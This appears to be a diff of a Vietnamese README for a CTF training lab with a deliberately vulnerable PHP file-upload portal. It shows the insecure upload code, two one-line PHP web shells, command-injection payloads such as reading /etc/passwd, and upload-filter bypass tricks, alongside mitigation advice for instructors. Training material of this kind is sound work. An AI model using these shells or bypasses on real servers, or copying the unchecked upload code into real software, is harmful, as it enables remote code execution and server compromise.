@@ -1,124 +1,107 @@
 
-# 🛡️ ChronoSoft Internal Upload Portal (CTF Lab)
+# 🛡️ ChronoSoft Internal Upload Portal (CTF Lab - File Upload)
 
-**Môi trường thực hành khai thác lỗ hổng File Upload và Command Injection cho mục đích đào tạo an toàn thông tin.**  
-Dự án được xây dựng bởi bộ phận bảo mật giả lập của công ty tưởng tượng **ChronoSoft Ltd.**
-
----
-
-## 🎯 Mục tiêu học tập
-
-Thông qua phòng lab này, học viên sẽ được học và thực hành:
-
-- Phân tích và khai thác **lỗ hổng tải tệp tin** (File Upload Vulnerability)
-- Thực hiện **RCE (Remote Code Execution)** thông qua việc upload backdoor hoặc shell script
-- Hiểu và thực hành khai thác **Command Injection** trong môi trường web PHP
-- Kỹ thuật tìm và truy cập file bị ẩn (hidden paths hoặc obfuscated filenames)
-- Tìm và chiếm được **flag** được cất giấu trong hệ thống nội bộ
+**Môi trường thực hành mô phỏng lỗ hổng File Upload trong ứng dụng web.**  
+Đây là một CTF Lab được thiết kế để giúp học viên hiểu rõ và khai thác các lỗi sai phổ biến trong chức năng upload tệp tin.
 
 ---
 
-## 🧪 Kiến thức trọng tâm
+## 📄 Mô tả hệ thống
 
-### 1. File Upload Vulnerabilities
+Trang HTML chính cho phép người dùng tải lên tệp tin nội bộ (giả lập tài liệu nhân sự) qua form đơn giản:
 
-- Cơ chế xử lý file sai cách (không kiểm tra MIME, không lọc phần mở rộng)
-- Bỏ qua các biện pháp lọc như: `.php.jpg`, null byte (`.php%00.jpg`), case bypass (`.PhP`)
-- Sử dụng PHP Shell phổ biến như `b374k`, `pentestmonkey reverse shell`, v.v.
+```html
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="file" required />
+    <input type="submit" value="Upload Document" />
+</form>
+```
 
-### 2. Command Injection
+Mã PHP phía server thực hiện:
 
-- Sử dụng input của người dùng trong hàm hệ thống như `system()`, `exec()`, `shell_exec()` mà không lọc
-- Payload mẫu: `; ls -la`, `&& cat /etc/passwd`, `| whoami`
-- Kỹ thuật Blind Command Injection (xài delay hoặc DNS exfiltration)
-
-### 3. Hành vi và kỹ thuật tìm file ẩn
-
-- Truy cập trực tiếp theo phỏng đoán đường dẫn: `/uploads/shell.php`
-- Brute-force tên file với wordlist: `gobuster`, `ffuf`
-- Quan sát response code và thời gian phản hồi để đoán đường dẫn
+```php
+$upload_dir = 'upload/';
+$upload_file = $upload_dir . basename($_FILES['file']['name']);
+move_uploaded_file($_FILES['file']['tmp_name'], $upload_file);
+```
 
 ---
 
-## 🚀 Hướng dẫn triển khai với Docker
+## ⚠️ Lỗ hổng bảo mật
 
-### Yêu cầu:
+Chức năng upload này có những điểm yếu nghiêm trọng:
 
-- Cài đặt [Docker](https://www.docker.com/) và [Docker Compose](https://docs.docker.com/compose/)
+- ❌ Không kiểm tra định dạng (extension) của file
+- ❌ Không xác thực MIME type
+- ❌ Không lọc tên file nguy hiểm (như `.php`, `.exe`)
+- ❌ Không đổi tên file khi lưu (có thể bị ghi đè hoặc dự đoán)
+- ❌ Thư mục lưu file có thể truy cập trực tiếp (`upload/`)
 
-### Cách chạy:
+📌 Hậu quả: Kẻ tấn công có thể upload một **web shell** (ví dụ: `shell.php`) và truy cập qua trình duyệt để thực thi mã trên server.
+
+---
+
+## 🎯 Mục tiêu của học viên
+
+1. Thử upload file `.php` chứa mã thực thi
+2. Truy cập đường dẫn `/upload/[filename]` để kiểm tra thực thi
+3. Nếu thành công, thử gửi các lệnh hệ thống (ví dụ: `id`, `ls`, v.v.)
+4. Ghi lại kết quả và học cách phòng chống lỗi này
+
+---
+
+## 🚀 Hướng dẫn triển khai
 
 ```bash
 docker-compose up --build
 ```
 
-Ứng dụng sẽ chạy tại địa chỉ:
+Sau khi chạy, truy cập trình duyệt tại:
 
 🔗 http://localhost:8080
 
 ---
 
-## 🕵️‍♀️ Các thử thách trong hệ thống
+## 🧪 Gợi ý khai thác
 
-| STT | Mô tả | Gợi ý |
-|-----|------|-------|
-| 1 | Upload file thực thi (Web Shell) | Thử các cách đặt tên để bypass lọc |
-| 2 | Truy cập file đã upload | Dò path hoặc dùng tool tìm |
-| 3 | Tìm nơi chứa FLAG | Có thể liên quan đến RCE |
-| 4 | Khai thác command injection | Input user đi vào hàm `system()`? |
-| 5 | Đọc nội dung nhạy cảm | `/etc/passwd`, hoặc file chứa flag |
+| Hành động | Gợi ý |
+|-----------|-------|
+| Upload shell | Dùng file như `shell.php`, `cmd.php`, hoặc script đơn giản |
+| Truy cập file | Truy cập `http://localhost:8080/upload/shell.php` |
+| Gửi lệnh | Nếu file thực thi, thử truyền lệnh qua GET: `?cmd=id` |
 
 ---
 
-## 🧰 Gợi ý công cụ hỗ trợ
+## 📦 Một số mã shell cơ bản
 
-- 🧪 **Burp Suite**: kiểm tra và gửi request tùy chỉnh
-- 📁 **Gobuster / FFUF**: tìm file và folder ẩn
-- 🐚 **Curl / Wget / Netcat**: gửi request, thiết lập reverse shell
-- 🐍 **Python**: để viết reverse shell hoặc xử lý payload encode
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+```php
+<?php echo shell_exec($_REQUEST["cmd"]); ?>
+```
+
+---
+
+## 📌 Hướng dẫn phòng chống (dành cho giảng viên)
+
+- Chỉ cho phép một số định dạng tệp tin cụ thể (PDF, PNG, DOCX)
+- Kiểm tra MIME type, magic bytes
+- Đổi tên file khi lưu (sử dụng UUID, hash + timestamp)
+- Không cho phép truy cập trực tiếp thư mục lưu trữ
+- Cấm thực thi file trong thư mục upload (qua cấu hình `.htaccess` hoặc web server)
 
 ---
 
 ## 📬 Liên hệ (giả lập)
 
-Nếu bạn là thành viên của đội bảo mật nội bộ, hãy gửi báo cáo về lỗ hổng qua email:
-
 📧 `security@chronosoft.io`
 
 ---
 
-## 🔐 Ghi chú dành cho giảng viên
+## ⚠️ Cảnh báo
 
-- Mã nguồn không nên được cung cấp trực tiếp cho học viên
-- Khuyến khích học viên tự khai thác thay vì xem code
-- Có thể cài thêm plugin monitor container để kiểm tra hoạt động của học viên
-
----
-
-## 🏁 FLAG
-
-> 🔍 Flag được ẩn kỹ trong hệ thống. Nó sẽ không dễ dàng hiển thị khi bạn chỉ upload file đơn thuần.  
-> Bạn cần khai thác đúng lỗ hổng **Command Injection** để đọc được file flag này.
-
----
-
-## 📌 Các kỹ thuật bypass upload phổ biến
-
-- Đổi phần mở rộng `.php.png`, `.php5`, `.phtml`
-- Dùng Content-Type giả mạo (`image/jpeg`)
-- Double extension: `shell.php.jpg`
-- Null byte injection: `shell.php%00.jpg` (chỉ hoạt động ở phiên bản PHP < 5.3)
-- RCE sau khi upload thành công: `http://host/uploads/shell.php?cmd=id`
-
----
-
-## 📚 Tài liệu tham khảo
-
-- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
-- [PayloadAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
-- [PHP Web Shell Collection](https://github.com/tennc/webshell)
-
----
-
-> 🧑‍💻 **Lưu ý quan trọng:** Môi trường này chỉ được dùng cho mục đích giáo dục và kiểm thử hợp pháp. Không được sử dụng cho các hoạt động khai thác thực tế hoặc trái phép.
-
+> Đây là môi trường chứa lỗ hổng có chủ đích.  
+> Tuyệt đối không triển khai trên môi trường thật.  
+> Chỉ sử dụng cho mục đích giáo dục và thử nghiệm trong phạm vi kiểm soát.`
